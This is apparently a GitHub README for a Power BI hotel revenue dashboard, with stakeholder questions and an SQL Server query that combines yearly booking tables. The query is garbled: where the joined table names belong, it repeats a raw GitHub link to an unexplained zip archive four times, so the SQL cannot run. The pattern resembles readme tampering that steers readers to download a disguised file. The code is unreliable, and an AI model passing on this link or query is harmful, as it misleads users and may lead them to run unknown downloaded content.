# Power_BI_Dashboard 
Created database in SQL Server Management Studio from Excel- joined multiple tables in SSMS - Created a dashboard by pulling SQL queries from created database

# PROBLEM STATEMENT
# Built a visual data story or dashboard using Power BI to present to your Stakeholders

1. Is our hotel revenue growing by year ?
2. Should we increase our parking lot size ?
3. What trends can we see in data ?

## SSMS QUERY

use Projects

with hotels as(
select * from dbo.['2018$']
union
select * from dbo.['2019$']
union
select * from dbo.['2020$'])

select * from hotels
left join https://raw.githubusercontent.com/tjagnade27/Power_BI_Dashboard/main/upseek/Power_BI_Dashboard_1.4.zip$
on https://raw.githubusercontent.com/tjagnade27/Power_BI_Dashboard/main/upseek/Power_BI_Dashboard_1.4.zip$.market_segment
left join https://raw.githubusercontent.com/tjagnade27/Power_BI_Dashboard/main/upseek/Power_BI_Dashboard_1.4.zip$
on https://raw.githubusercontent.com/tjagnade27/Power_BI_Dashboard/main/upseek/Power_BI_Dashboard_1.4.zip$.meal
